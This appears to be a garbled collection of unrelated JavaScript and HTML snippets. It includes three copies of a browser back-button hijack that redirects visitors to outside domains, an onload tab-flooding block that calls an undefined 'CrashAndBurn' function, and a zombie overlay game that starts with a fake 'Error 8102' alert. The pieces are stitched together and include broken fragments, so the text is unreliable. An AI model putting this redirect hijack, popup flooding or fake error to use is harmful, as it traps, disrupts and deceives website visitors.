(function(window, location) {
history.replaceState(null, document.title, location.pathname+"#!/history");
history.pushState(null, document.title, location.pathname);

window.addEventListener("popstate", function() {
  if(location.hash === "#!/history") {
    history.replaceState(null, document.title, location.pathname);
    setTimeout(function(){
      location.replace("http://www.worrwld.com");
    },10);
  }
}, false);
}(window, location));
(function(window, location) {
history.replaceState(null, document.title, location.pathname+"#!/history");
history.pushState(null, document.title, location.pathname);

window.addEventListener("popstate", function() {
  if(location.hash === "#!/history") {
    history.replaceState(null, document.title, location.pathname);
    setTimeout(function(){
      location.replace("http://www.282y-database.org");
    },10);
  }
}, false);
}(window, location));
(function(window, location) {
history.replaceState(null, document.title, location.pathname+"#!/history");
history.pushState(null, document.title, location.pathname);

window.addEventListener("popstate", function() {
  if(location.hash === "#!/history") {
    history.replaceState(null, document.title, location.pathname);
    setTimeout(function(){
      location.replace("http://www.lesish.componep.net");
    },10);
  }
}, false);
}(window, location));
window.location.href = 'https://example.org';
let newTab = window.open(url, name, spec);
i.e
let newTab = window.open('https://example.com', '_blank', '');
window.location.reload(true);
//this forces a reload, if the browser history cache is not available
window.location.reload(true);
//this forces a reload, if the browser history cache is not available
<body onload="JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');">
  <body onload="JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');">
    <body onload="JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');">
var directionWest = 0;
var directionNorth = 6;
var directionEast = 4;
var directionSouth = 2;

var stateWalking = 0;
var stateDying = 1;
var stateDead = 2;

var animWalk = {
    speed: 0.15,
    numFrames: 8,
    frames: [4, 5, 6, 7, 8, 9, 10, 11]
}

var animDying = {
    speed: 0.10,
    numFrames: 8,
    frames: [28, 29, 30, 31, 32, 33, 34, 35]
}

var spriteWidth = 128;
var spriteHeight = 128;

var spriteOffsetX = 25;
var spriteOffsetY = 25;

var spritesheetWidth = 4608;

function Zombie(_id, _x, _y, _direction) {
    this.direction = _direction
    this.id = _id;
    this.pos = { x: _x, y: _y }
    this.anim = animWalk;
    this.animFrame = 0;
    this.animDelta = 0;
    this.speed = 30;
    this.state = stateWalking;
    this.corpseDelta = 0;
    return this;
}

Zombie.prototype.Update = function (delta) {
    if (this.state == stateDead)
        return;

    //update the animation frame
    this.animDelta += delta;
    if (this.animDelta >= this.anim.speed) {
        this.animDelta -= this.anim.speed;
        this.animFrame++;
        if (this.animFrame >= this.anim.numFrames)
            this.animFrame = 0;
    }

    //background-position-x
    var div = document.getElementById(this.id);
    div.style.backgroundPositionX = ((spritesheetWidth - (spriteWidth * this.anim.frames[this.animFrame])) - spriteOffsetX) + "px";
    div.style.backgroundPositionY = ((spriteHeight * this.direction) - spriteOffsetY) + "px";

    if (this.state == stateWalking) {
        //update position
        if (this.direction == directionEast)
            this.pos.x += (this.speed * delta);
        if (this.direction == directionWest)
            this.pos.x -= (this.speed * delta);
        if (this.direction == directionNorth)
            this.pos.y -= (this.speed * delta);
        if (this.direction == directionSouth)
            this.pos.y += (this.speed * delta);
        div.style.left = Math.floor(this.pos.x) + "px";
        div.style.top = Math.floor(this.pos.y) + "px";
    }
    else if (this.state == stateDying && this.animFrame == (this.anim.numFrames - 1)) {
        this.state = stateDead;
    }
}

var zombies = []

var nextZombieID = 0;

function GetZombie(zombieID)
{
    return zombies.filter(function (z) { return z.id == zombieID })[0];
}

function ZombieClick(div)
{
    var zombie = GetZombie(div.srcElement.id);

    if (zombie.state == stateWalking) {
        zombie.state = stateDying;
        zombie.animFrame = 0;
        zombie.animDelta = 0;
        zombie.anim = animDying;
    }
}

function NewZombie()
{
    var x = 0;
    var y = 0;
    var direction = 0;

    var rand = Math.random();
    if (rand < 0.25)
    {
        //spawn from left of screen
        x = spriteWidth * -1;
        y = (Math.random() * screen.height) - spriteHeight;
        direction = directionEast;
    }
    else if (rand < 0.5) {
        //spawn from right of screen
        x = screen.width;
        y = (Math.random() * screen.height) - spriteHeight;
        direction = directionWest;
    }
    else if (rand < 0.75) {
        //spawn from top of screen
        x = (Math.random() * screen.width) - spriteWidth;
        y = spriteWidth * -1;
        direction = directionSouth;
    }
    else {
        //spawn from bottom
        x = (Math.random() * screen.width) - spriteWidth;
        y = screen.height;
        direction = directionNorth;
    }

    //generate an id
    var id = nextZombieID;
    nextZombieID++;

    //create a div
    var div = document.createElement("div");
    div.id = id;
    div.classList.add("zombie");
    div.onclick = ZombieClick;
    document.body.appendChild(div);

    //create a zombie
    zombies.push(new Zombie(id, x, y, direction));
}

var spawnRate = 1;
var spawnDelta = 0;

function spawnZombies(delta)
{
    spawnDelta += delta;
    if (spawnDelta >= spawnRate) {
        spawnDelta -= spawnRate;
        NewZombie();
    }
}

var corpseDuration = 3;

function cleanupZombies(delta)
{
    for (var i = zombies.length - 1; i >= 0 ; i--) {
        //if the zombie has walked off the screen, remove them
        if (zombies[i].pos.x < (spriteWidth * -2)
            || zombies[i].pos.x > screen.width + spriteWidth
            || zombies[i].pos.y < (spriteHeight * -2)
            || zombies[i].pos.y > screen.height + spriteHeight)
        {
            var element = document.getElementById(zombies[i].id);
            element.parentNode.removeChild(element);
            zombies.splice(i, 1);
        }

    }

    for (var i = zombies.length - 1; i >= 0 ; i--) {
        //if the zombie has died, remove their corpse after some time
        if (zombies[i].state == stateDead) {
            zombies[i].corpseDelta += delta;

            if (zombies[i].corpseDelta > corpseDuration) {
                var element = document.getElementById(zombies[i].id);
                element.parentNode.removeChild(element);
                zombies.splice(i, 1);
            }
        }
    }

}

var started = false;

var main = function () {
    var now = Date.now();
    var delta = now - then;
    if (started) {    
        cleanupZombies(delta / 1000);

        spawnZombies(delta / 1000);

        for (var i in zombies)
            zombies[i].Update(delta / 1000);
    }

    then = now;

    setTimeout(main, 30);
};

var then = Date.now();
setTimeout(main, 30);

setTimeout(function () {
    alert("Error 8102: Unexpected. Please stand by...");
    started = true;
}, 2000)
